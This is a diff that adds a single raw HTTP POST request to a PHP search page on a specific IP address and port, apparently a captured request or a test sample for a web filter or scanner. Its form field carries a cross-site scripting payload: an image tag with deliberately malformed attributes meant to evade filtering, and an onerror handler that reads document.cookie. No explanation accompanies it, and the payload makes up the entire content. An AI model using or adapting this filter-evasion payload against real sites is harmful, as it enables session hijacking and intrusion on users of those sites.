@@ -1,0 +1,20 @@
+POST /seacher-11.php HTTP/1.1
+Host: 180.168.251.195:8183
+Connection: close
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4093.3 Safari/537.36
+Accept: image/Webp,image/apng,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://180.168.251.195:8183/seacher-11.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-HK;q=0.7,zh-CN;q=0.6,zh-TW;q=0.5
+Cookie: PHPSESSID=biq151q1uo2ce3reifs86ef12p
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXs27zg3h
+Content-Length: 465
+
+------WebKitFormBoundaryXs27zg3h
+Content-Disposition: form-data; name="a"
+
+<img src=1 ont<oggle="al``"onerror=confirm(document.cookie)>
+------WebKitFormBoundaryXs27zg3h--
